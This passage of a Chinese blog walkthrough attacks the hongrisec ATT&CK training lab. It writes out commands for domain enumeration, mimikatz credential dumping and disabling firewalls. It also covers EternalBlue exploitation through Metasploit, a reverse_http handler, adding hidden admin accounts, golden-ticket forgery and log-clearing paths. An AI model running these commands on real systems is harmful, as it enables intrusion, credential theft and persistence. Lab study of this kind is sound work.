/domain</span><br><span class="line">查看时间服务器</span><br><span class="line"></span><br><span class="line">shell net config workstation</span><br><span class="line">查看当前的登录域与用户信息</span><br><span class="line"></span><br><span class="line">shell nslookup god.org</span><br><span class="line">寻找域dns服务器ip</span><br><span class="line"></span><br><span class="line">shell ping -a god.org</span><br><span class="line">ping dns服务器</span><br><span class="line"></span><br><span class="line">shell net user /domain</span><br><span class="line">获取当前域内的用户</span><br><span class="line"></span><br><span class="line">shell wmic useraccount get /all</span><br><span class="line">获取域内用户的详细信息</span><br><span class="line"></span><br><span class="line">shell net group &quot;domain computers&quot; /domain</span><br><span class="line">查看当前域成员计算机列表</span><br><span class="line"></span><br><span class="line">shell net group &quot;domain admins&quot; /domain</span><br><span class="line">查看域管理员的用户组</span><br><span class="line"></span><br><span class="line">shell net group &quot;Enterprise admins&quot; /domain</span><br><span class="line">查询域系统管理员用户组</span><br><span class="line"></span><br><span class="line">shell net group &quot;domain controllers&quot; /domain</span><br><span class="line">查看域控制器</span><br><span class="line"></span><br><span class="line">shell net accounts /domain</span><br><span class="line">获取域密码信息</span><br><span class="line"></span><br><span class="line">net view</span><br><span class="line">扫描端口信息</span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line">读取内存密码</span><br><span class="line"></span><br><span class="line">logonpasswords</span><br><span class="line">用mimakatz读注册表密码</span><br><span class="line"></span><br><span class="line">shell for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br><span class="line">探测内网其他主机</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20220609214727214.png" alt="image-20220609214727214"></p><h4 id="3389远程登录"><a href="#3389远程登录" class="headerlink" title="3389远程登录"></a>3389远程登录</h4><p>这里我们可以通过<code>ladon</code>神器一键开启<code>3389</code>端口</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007162652903.png" alt="image-20231007162652903"></p><p>当然也有备用方案, 通过修改注册表开启<code>3389</code>, 并可以关闭防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">netsh firewall set opmode disable   			# winsows server 2003 之前</span><br><span class="line">netsh advfirewall set allprofiles state off 	# winsows server 2003 之后</span><br></pre></td></tr></table></figure><p>然后我们可以添加一个花生壳来内网穿透</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007162900229.png" alt="image-20231007162900229"></p><p>当然也可以不用花生壳, 因为这台服务器本来就开放了公网IP</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007173358094.png" alt="image-20231007173358094"></p><p>之后我们就直接可以用自己电脑远程登录链接到靶机</p><p><code>win+r</code>输入<code>mstsc</code> 地址为花生壳生成的地址</p><p>账号密码就是我们获取到的账号密码, 我这里是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">god\Administrator</span><br><span class="line">hongrisec@2023</span><br></pre></td></tr></table></figure><p>成功登录<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007163133595.png" alt="image-20231007163133595"></p><h4 id="内网漏洞扫描"><a href="#内网漏洞扫描" class="headerlink" title="内网漏洞扫描"></a>内网漏洞扫描</h4><p>远程登陆我们发现靶机上有一个nmap, 可以进一步针对内网主机进行漏洞信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln 192.168.52.0/24</span><br></pre></td></tr></table></figure><p>我们可以发现<code>192.168.52.141</code>也就是域成员主机存在<code>ms08-067</code>和<code>ms17-010</code>漏洞.</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007174605044.png" alt="image-20231007174605044"></p><p>而且域控主机<code>192.168.52.138</code>存在<code>ms17-010</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007175144258.png" alt="image-20231007175144258"></p><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><h4 id="CS派生SMB-beacon"><a href="#CS派生SMB-beacon" class="headerlink" title="CS派生SMB beacon"></a>CS派生SMB beacon</h4><p>SMB beacon通过命名管道与父级beacon进行通信, 当两个beacons连接之后, 子beacon从父beacon获取到任务并发送, 因为连接的beacons使用Windows命名管道进行通信, 此流量封装在smb协议中, 所以smb beacon相对隐蔽, 绕过防火墙有奇效.</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/20200806151158825.png" alt="img"></p><p>这时候我们就可以使用smb beacon 然主机C上线。(前提是有主机C的账号密码)</p><p>第一种是在已经有的beacon上建立监听, 用来作为跳板内网穿透, 前提是通过shell访问其他内网主机, 也就是获取dc(设备描述表)的方法</p><p>第二种是直接派生一个子beacon, 目的是为了进一步盗取内网主机的hash, 新建一个listener, payload设置为beacon smb</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007213157304.png" alt="image-20231007213157304"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007213251525.png" alt="image-20231007213251525"></p><p>保存, 然后新建一个会话, 选择我们新添加的SMB</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007213420029.png" alt="image-20231007213420029"></p><p>可以看到派生了一个新的子会话, 这就是派生的 SMB Beacon，当前没有连接</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007222359185.png" alt="image-20231007222359185"></p><p>可以在主 Beacon 上用 link host 连接它，或者 unlink host 断开它</p><p>可以进一步盗取内网主机的 hash</p><h4 id="psexec使用凭证登录其他主机"><a href="#psexec使用凭证登录其他主机" class="headerlink" title="psexec使用凭证登录其他主机"></a>psexec使用凭证登录其他主机</h4><p>网络探测</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007220219014.png" alt="image-20231007220219014"></p><p>目标列表可以查看刚才探测到的内网其他主机</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007220506679.png" alt="image-20231007220506679"></p><p>再看一下我们之前啊mimikatz读取的密码</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231007221730117.png" alt="image-20231007221730117"></p><p>右键选择一台主机</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231008154443756.png" alt="image-20231008154443756"></p><p>同样方法可以上线另一台主机</p><p>TIPS: 这中间的任何问题都是最初密码的问题, 最终解决方案可以通过重新部署两台winserver解决</p><p>这是我比较混乱的最终效果</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231009223355028.png" alt="image-20231009223355028"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231009223418482.png" alt="image-20231009223418482"></p><h4 id="MSF联动CS"><a href="#MSF联动CS" class="headerlink" title="MSF联动CS"></a>MSF联动CS</h4><p>MSF启动!</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231009223701265.png" alt="image-20231009223701265"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">使用监听模块</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">设置 payload为 windows下的反向http连接</span><br><span class="line"></span><br><span class="line">set lhost 192.168.224.128</span><br><span class="line">设置本机ip作为监听ip</span><br><span class="line"></span><br><span class="line">set lport 9999</span><br><span class="line">设置本机9999端口作为监听端口</span><br><span class="line"></span><br><span class="line">run </span><br><span class="line">运行</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231010201950639.png" alt="image-20231010201950639"></p><p>回到cs, 新建一个监听器</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231010202309364.png" alt="image-20231010202309364"></p><p>然后新建会话使用这个msf监听器</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231010202349382.png" alt="image-20231010202349382"></p><p>shell成功接到msf</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231010204951407.png" alt="image-20231010204951407"></p><p>接下来配置静态路由</p><blockquote><p>配置静态路由的主要目的是绕过网络防火墙、路由器或其他网络设备的限制，以便在目标网络上移动、侦察或执行特定任务。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">查看网段子网</span><br><span class="line"></span><br><span class="line">run autoroute -s 192.168.52.0/24 </span><br><span class="line">添加路由</span><br><span class="line"></span><br><span class="line">run autoroute -p</span><br><span class="line">查看路由</span><br><span class="line"></span><br><span class="line">background</span><br><span class="line">转入后台</span><br></pre></td></tr></table></figure><p>接下来代理转发</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231010210403884.png" alt="image-20231010210403884"></p><p>或者使用msf的代理模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"></span><br><span class="line">set version 5</span><br><span class="line"></span><br><span class="line">set srvhost 192.168.224.128</span><br></pre></td></tr></table></figure><p>然后修改配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011120845341.png" alt="image-20231011120845341"></p><p>刚才收集到域成员主机存在<code>MS08-067</code>和<code>MS17_010</code>漏洞，由于目标系统无法直接连接到攻击机，所以需要将payload设置为<code>Bind_tcp</code>类型展开攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks:192.168.224.128:8888</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>拿到会话, 但是会因为蓝屏没法执行命令, 可以使用<code>auxiliary/admin/smb/ms17_010_command</code>执行命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/admin/smb/ms17_010_command</span><br><span class="line">使用这个模块</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line">设置ip</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="built_in">whoami</span></span><br><span class="line">设置命令</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011122545699.png" alt="image-20231011122545699"></p><p>接下来关闭防火墙, 开启3389远程登陆</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span><br><span class="line">run</span><br><span class="line">set command &#x27;netsh advfirewall set allprofiles state off&#x27;</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011124536545.png" alt="image-20231011124536545"></p><p>然后添加用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set command net user 6 123qwe. /add </span><br><span class="line">run</span><br><span class="line">set command net localgroup  administrators  6 /add </span><br><span class="line">run</span><br><span class="line">rdesktop 192.168.52.138 -u 6 -p 123qwe.</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011190349127.png" alt="image-20231011190349127"></p><p>但是这里我们无法进入owa域, 我们手动改到god域, 成功登录<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011191333137.png" alt="image-20231011191333137"></p><p>接下来我们开始连接另一台机器</p><p>之前漏扫得到<code>192.168.52.141</code>存在<code>ms08-067</code>和<code>ms17-010</code>漏洞</p><p>其中<code>ms17-010</code>上面已经演示过, 这里我们先演示一下<code>ms08-067</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms08-067</span><br><span class="line">use 0</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">set lhost 192.168.224.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011195908280.png" alt="image-20231011195908280"></p><p>多次尝试以失败告终, 那么只能再利用一下<code>ms17-010</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks:192.168.224.128:8888</span><br><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span><br><span class="line">run</span><br><span class="line">set command &#x27;netsh firewall set opmode disable&#x27;</span><br><span class="line">run</span><br><span class="line">set command net user 6 123qwe. /add </span><br><span class="line">run</span><br><span class="line">set command net localgroup  administrators  6 /add </span><br><span class="line">run</span><br><span class="line">rdesktop 192.168.52.141 -u 6 -p 123qwe.</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011221057155.png" alt="image-20231011221057155"></p><p>这里再介绍一下<code>telnet</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command sc config tlntsvr start= auto</span><br><span class="line">run</span><br><span class="line">set command net start telnet</span><br><span class="line">run</span><br><span class="line">set command netstat -an</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011223123911.png" alt="image-20231011223123911"></p><p>开启完后我们尝试连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set username 6</span><br><span class="line">set password 123qwe.</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011223427818.png" alt="image-20231011223427818"></p><p>利用失败, 手动连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.52.141</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231011223551431.png" alt="image-20231011223551431"></p><p>成功了, <code>exit</code>可以退出</p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>这里我们已经拿到了域控主机, 先hashdump得到kebtgt账户的NTLM值</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013125649024.png" alt="image-20231013125649024"></p><blockquote><p>krbtgt用户是系统在创建域时自动生成的账号，密码是随机生成的，无法登录主机，是KDC(<a class="link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&spm=1001.2101.3001.7020">密钥<i class="fas fa-external-link-alt"></i></a>分发中心)的服务账号。在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:58e91a5ac358d86513ab224312314061:::</span><br></pre></td></tr></table></figure><p>然后用<code>mimikatz</code>找到一个合法的sid</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013130402730.png" alt="image-20231013130402730"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-2952760202-1353902439-2381784089-500</span><br></pre></td></tr></table></figure><p>然后就可以构造黄金票据了, 用户名任意, 域名为当前域名, sid和hash值就是刚才获取到的</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013130737750.png" alt="image-20231013130737750"></p><p>可以使用<code>mimikatz kerberos::list</code>命令查看当前系统的票据:</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013130857710.png" alt="image-20231013130857710"></p><p>那么即使域控这台主机权限掉了或密码被修改了，我们依然可以使用边缘主机的黄金票据模拟获得最高权限，由于跳过AS验证，也就无需担心域管密码被修改</p><p>加载票据访问，选择监听器后执行，主机成功上线：</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013134459154.png" alt="image-20231013134459154"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013134436526.png" alt="image-20231013134436526"></p><p>补充金票银票的区别：</p><p>金票Golden ticket：<br>在Kerberos认证中，Client通过AS(身份认证服务)认证后,AS会给Client一个Logon Session Key和TGT，而Logon Session Key并不会保存在KDC中，krbtgt 的 NTLM Hash又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码，所以也不担心域管密码修改。</p><p>特点：不需要与AS进行交互，需要用户 krbtgt 的 Hash</p><p>条件：域名称、域的SID值、域的 KRBTGT 账号的 HASH、伪造任意用户名</p><p>AS：校验访问用户身份，看看你是谁，如果你的用户名存在AS对的数据库里面，那么就会给你一个随机64位的值，但是这个值是经过你的用户密码加密的，你得本地拿自己密码解开，这个是用来通信的，你和TGS的沟通都会用这个密钥加密。</p><p>TGS：和目标机器进行交互，中间用AS提供的密钥加密，然后对你提供的密码进行校验。</p><p>银票SILVER TICKET：<br>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。<br>在Kerberos认证的第三步，Client 带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key解密ST，从而获得Session Key。通过Session Key解密Authenticator3，进而验证对方的身份,验证成功就让 Client 访问 Server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用。</p><p>特点：不需要与KDC进行交互、需要 server 的NTLM hash</p><p>区别：<br>获取的权限不同：<br>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p><p>认证流程不同：<br>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server加密方式不同：<br>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p><h4 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h4><p>先删除之前创建的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user 6 /delete</span><br></pre></td></tr></table></figure><p>接下来添加隐藏用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell net user 666$ 123qwe. /add</span><br><span class="line">shell net localgroup administrators 666$ /add</span><br><span class="line">shell net user</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013140358769.png" alt="image-20231013140358769"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.52.138 -u 666$ -p 123qwe.</span><br></pre></td></tr></table></figure><p>更改注册表</p><p><code>regedit</code>打开注册表, 找到<code>HKEY_LOCAL_MACHINE\SAM\SAM</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013150047296.png" alt="image-20231013150047296"></p><p>给<code>administrators</code>赋予完全控制权限</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013150219948.png" alt="image-20231013150219948"></p><p>将 <code>Administrator</code> 用户对应项的 F 数据值复制到 <code>666$</code> 用户对应项的 F 数据值, 其中<code>000001F4</code>就是<code>Administrator</code> 用户<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013151826961.png"></p><p>但是这里失败, 不过我们可以直接利用<a class="link" target="_blank" rel="noopener" href="https://github.com/wgpsec/CreateHiddenAccount/releases">工具: CreateHiddenAccount<i class="fas fa-external-link-alt"></i></a></p><p>将<code>CreateHiddenAccount_v0.2.exe</code>上传到机器</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013153842103.png" alt="image-20231013153842103"></p><p>管理员身份启动cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount_v0.2.exe -c 检查是否有隐藏账户</span><br><span class="line">CreateHiddenAccount_v0.2.exe -u wanan -p p-0p-0p-0  创建名为wanan，密码为p-0p-0p-0的账户。会自动补上$</span><br><span class="line">CreateHiddenAccount_v0.2.exe -d wanan$ 删除隐藏账户</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013154153816.png" alt="image-20231013154153816"></p><p>这里由于靶场原因很多手段都失败了, 这里记录一下较为全面的方法</p><p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/122297100">https://blog.csdn.net/qq_48985780/article/details/122297100<i class="fas fa-external-link-alt"></i></a></p><h3 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h3><p>windows 日志路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx</span><br><span class="line"></span><br><span class="line">安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br><span class="line"></span><br><span class="line">应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br><span class="line"></span><br><span class="line">日志在注册表的键：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20231013155258241.png" alt="image-20231013155258241"></p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/Study/">#Study</a>&nbsp;</li><li class="tag-item"><a href="/tags/ATK-CK/">#ATK&amp;CK</a>&nbsp;</li><li class="tag-item"><a href="/tags/hongrisec/">#hongrisec</a>&nbsp;</li><li class="tag-item"><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2023/10/17/AoiAWD%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">AoiAWD踩雷指南</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2023/06/21/pwn_patch/"><span class="title flex-center"><span class="post-nav-title-item">Pwn_patch</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline-meta.css"><script src="//unpkg.com/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">环境搭建与网络配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E8%B7%AF%E6%9E%B6%E6%9E%84%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">网路架构图:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.</span> <span class="nav-text">虚拟机网络环境:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%84%E5%8F%B0%E6%9C%BA%E5%99%A8%E8%AF%A6%E7%BB%86%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.</span> <span class="nav-text">各台机器详细配置:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">2.1.</span> <span class="nav-text">端口探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">web漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">3.1.</span> <span class="nav-text">后台弱口令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E5%86%99%E5%85%A5shell%E6%96%87%E4%BB%B6"><span class="nav-number">3.2.</span> <span 